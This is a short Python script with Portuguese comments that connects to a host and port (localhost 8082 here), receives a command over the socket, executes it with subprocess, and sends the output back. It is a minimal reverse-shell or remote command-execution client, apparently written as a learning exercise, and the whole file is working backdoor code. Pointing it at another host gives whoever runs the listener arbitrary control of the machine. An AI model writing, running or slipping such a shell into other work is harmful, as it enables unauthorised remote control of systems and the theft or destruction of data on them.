import socket
import subprocess

HOST = "127.0.0.1"
PORT = 8082

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    # Recebemos o comando:
    data = s.recv(1024)
    print("Recebido:", repr(data))

    # Executamos o comando:
    p = subprocess.Popen([data], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Enviamos a resposta do comando:
    s.send(p.stdout.read()+p.stderr.read())